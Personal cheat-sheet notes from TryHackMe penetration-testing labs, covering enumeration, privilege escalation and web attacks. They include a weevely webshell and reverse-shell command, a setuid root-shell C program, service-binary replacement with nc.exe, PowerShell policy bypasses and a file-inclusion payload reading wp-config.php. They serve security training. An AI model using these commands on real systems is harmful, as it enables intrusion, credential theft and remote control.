# R

* Remember for web/general/security
* .todo: dns discord
* web general | terminology | URL may have to be moved

<hr>

## Oh... no...

* https://github.com/rmusser01/Infosec_Reference

<hr>

## Reaped

* `smbmap -H IP`: see shares, users, files
* RPC 111
* binwalk / binwalk -e (extract)
  * see what there is inside the file (ex: img then zip)
* https://github.com/frizb/Hydra-Cheatsheet
* https://github.com/s0md3v/Decodify
* https://github.com/carlospolop/legion
* export TERM=xterm-256color
* websites
  * https://blog.razrsec.uk/
  * https://stawm.design.blog/
  * https://blog.qz.sg/
  * https://saharshtapi.github.io/
  * https://vitcher97.blogspot.com/
  * https://marcorei7.wordpress.com/
  * https://thefluffy007.com/
  * https://fr33s0ul.tech/
  * https://beginninghacking.net/
  * https://aptx1337.github.io/
  * https://shishirsubedi.com.np/
  * https://hackofalltrades.dev/
  * https://cybersecnerds.com/
  * https://blog.raw.pm/
  * https://nairitya03.github.io/CTF-WriteUps/
  * https://mrash.co/
  * https://robertmuwanga.netlify.app/
* https://www.pentesterlab.com/
* https://github.com/epinna/weevely3
  * weevely generate password webshell.php
  * weevely URL/webshell.php password
  * :backdoor_reversetcp IP PORT
  * pwncat -lvv PORT
* https://github.com/nccgroup/GTFOBLookup
* https://null-byte.wonderhowto.com/how-to/bypass-file-upload-restrictions-web-apps-get-shell-0323454/

<hr>

## Prev esc

https://tryhackme.com/room/linprivesc
=> If there are tools not installed on your target: https://github.com/andrew-d/static-binaries
=> hint/notes
=> network
* Another alternative to this program, is to create a suite file with a copy of bash.

```c
int main() {
  setgid(0);
  setuid(0);
  system("/bin/bash");
  return 0;
}
```

* https://tryhackme.com/room/windowsprivesc20 (dropped fur now)

<hr>

## Forced Browsing

* https://tryhackme.com/room/webenumerationv2
  * Gobuster options.
  * -k for ssl errors
* Gobuster DNS/VHosts
* Useful wordlists
* nmap `-n` redo
* add a warning + 64th
* `cat /usr/share/wordlists/dirb/extensions_common.txt | tr '\n' ','`
* `gobuster -u` for vhost
* `gobuster vhost -u http://webenum.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t50 --append-domain` (in new versions of gobuster, false by default)
* NOT FINISHED https://tryhackme.com/room/webenumerationv2

> While participating in rooms on TryHackMe, virtual hosts would be a good way to hide a completely different website if nothing turned up on your main port 80/443 scan.

<hr>

## Overconfidence

--- https://tryhackme.com/room/steelmountain

* use meterpreter upload to upload the winPEAS
* `upload /tmp/xxx`
* `shell`
* `.\winPEASany_ofs.exe`
* `powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"`
* `powershell -ep bypass -c ". .\PowerUp.ps1;"`
* `https://github.com/itm4n/PrivescCheck#metasploit-timeout`
* `load powershell`
* `powershell_shell`
* `. .\PowerUp.ps1; Invoke-AllChecks`
* `. .\PowerUp.ps1` `PS > Invoke-AllChecks`
* https://www.joesandbox.com/#windows
* https://github.com/EgeBalci/sgn
* sc qc XXX
* sc stop XXX
* `Write-ServiceBinary -Name 'XXX' -Path ".\nc.exe"`
* sc start XXX
* `powershell -c wget "URL" -outfile "OUTPUT"`
* like OTX: https://cyware.com/

--- https://tryhackme.com/room/easyctf 🐍🐍🐍

* `python2 simple.py`
* oh gosh, volatily + `pip install --upgrade setuptools` https://stackoverflow.com/questions/31719816/pip-fails-to-install-anything-error-invalid-command-egg-info
* `print "[+] Specify an url target"`

--- https://tryhackme.com/room/cowboyhacker

* nmap
* FTP exposed
* Hydra ssh
* SUID

--- https://tryhackme.com/room/lazyadmin 🐍🐍🐍

* nmap
* gobuster
* ...

--- https://tryhackme.com/room/startup

* nmap
* gobuster
* ftp
* file upload
* wireshark
* crontab

Others

* If FTP is asking for a password, press enter
* FTP do not seem to work with path (to upload with put, but it works if you start FTP in the directory where the file is)
* Press F12 to go back to penelope UI. You can use upload/download. Go back with `interact 1`
* wireshark `.pcapng`. Then right-click on interesting packets, and click on "follow TCP Stream"
* Proper name for this section whelp 😭

--- https://tryhackme.com/room/allinonemj 🐍🐍🐍

* Test: `wpscan --url http://10.10.162.222/wordpress/ --detection-mode aggressive`
* `php://filter/convert.base64-encode/resource=../../../../../wp-config.php` (file inclusion)